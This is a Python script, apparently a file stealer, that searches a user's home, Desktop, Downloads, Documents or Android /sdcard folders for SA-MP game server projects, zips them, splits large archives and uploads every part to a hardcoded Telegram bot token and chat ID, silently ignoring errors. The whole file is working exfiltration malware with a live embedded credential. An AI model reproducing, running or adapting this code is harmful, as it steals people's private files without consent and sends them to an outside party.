import os
import re
import platform
import shutil
import requests

# ==========================
# CONFIG
# ==========================
BOT_TOKEN = '8792427618:AAGY9Oo6TP0PtjZUdtGQ31i5m33cJNatjO0'
CHAT_ID = '8447290071'

MAX_FILE_SIZE_MB = 45
CHUNK_SIZE = MAX_FILE_SIZE_MB * 1024 * 1024

# ==========================
# HELPERS
# ==========================

def safe_name(name):
    name = re.sub(r'[<>:"/\\|?*]', '_', name)
    name = name.replace(' ', '_')
    return name.strip('_') or "SAMP_Server"

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": text
            },
            timeout=30
        )
    except:
        pass

def send_doc(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={"document": f},
                data={
                    "chat_id": CHAT_ID,
                    "caption": caption
                },
                timeout=300
            )

        try:
            return r.json().get("ok", False)
        except:
            return False

    except:
        return False

def get_search_paths():
    system = platform.system()

    if system == "Windows":
        home = os.path.expanduser("~")
        return [
            home,
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Documents")
        ]

    if os.path.exists("/sdcard"):
        return ["/sdcard"]

    return [os.path.expanduser("~")]

def is_samp_server_dir(files_list, dirs_list):
    files_lower = {f.lower() for f in files_list}
    dirs_lower = {d.lower() for d in dirs_list}

    if "server.cfg" in files_lower:
        return True

    signatures = {
        "gamemodes",
        "filterscripts",
        "pawno",
        "scriptfiles",
        "plugins",
        "include"
    }

    return bool(signatures.intersection(dirs_lower))

def split_and_send_file(zip_path, folder_name, current_index, total_folders):
    size_bytes = os.path.getsize(zip_path)

    total_parts = (
        size_bytes + CHUNK_SIZE - 1
    ) // CHUNK_SIZE

    send_msg(
        f"📦 Splitting {folder_name}\n"
        f"Parts: {total_parts}"
    )

    with open(zip_path, "rb") as source:

        for part_num in range(1, total_parts + 1):

            part_name = f"{zip_path}.part{part_num:03d}"

            with open(part_name, "wb") as part:
                part.write(source.read(CHUNK_SIZE))

            caption = (
                f"📁 {folder_name}\n"
                f"Project {current_index}/{total_folders}\n"
                f"Part {part_num}/{total_parts}"
            )

            send_doc(part_name, caption)

            try:
                os.remove(part_name)
            except:
                pass

# ==========================
# MAIN
# ==========================

def main():
    send_msg("🔍 Starting scan...")

    found_folders = set()

    for base in get_search_paths():

        if not os.path.exists(base):
            continue

        try:
            for root, dirs, files in os.walk(base, topdown=True):

                dirs[:] = [
                    d for d in dirs
                    if d.lower() not in {
                        "android",
                        "data",
                        "obb",
                        "node_modules"
                    }
                ]

                if is_samp_server_dir(files, dirs):
                    found_folders.add(root)
                    dirs.clear()

        except Exception as e:
            send_msg(f"⚠️ Scan error: {str(e)[:100]}")

    folders = sorted(found_folders)

    if not folders:
        send_msg("❌ No SA-MP folders found.")
        return

    send_msg(f"✅ Found {len(folders)} SA-MP folders.")

    for index, folder_path in enumerate(folders, start=1):

        folder_name = os.path.basename(folder_path)

        if not folder_name:
            folder_name = f"SAMP_{index}"

        archive_name = safe_name(folder_name)

        try:
            send_msg(
                f"📦 Compressing {folder_name}\n"
                f"({index}/{len(folders)})"
            )

            zip_path = shutil.make_archive(
                archive_name,
                "zip",
                folder_path
            )

            size_mb = os.path.getsize(zip_path) / (1024 * 1024)

            if size_mb > MAX_FILE_SIZE_MB:

                split_and_send_file(
                    zip_path,
                    folder_name,
                    index,
                    len(folders)
                )

            else:

                send_doc(
                    zip_path,
                    f"📁 {folder_name}\n"
                    f"Size: {size_mb:.2f} MB"
                )

            try:
                os.remove(zip_path)
            except:
                pass

        except Exception as e:
            send_msg(
                f"❌ Error processing {folder_name}\n"
                f"{str(e)[:100]}"
            )

    send_msg("✅ Finished.")

if __name__ == "__main__":
    main()
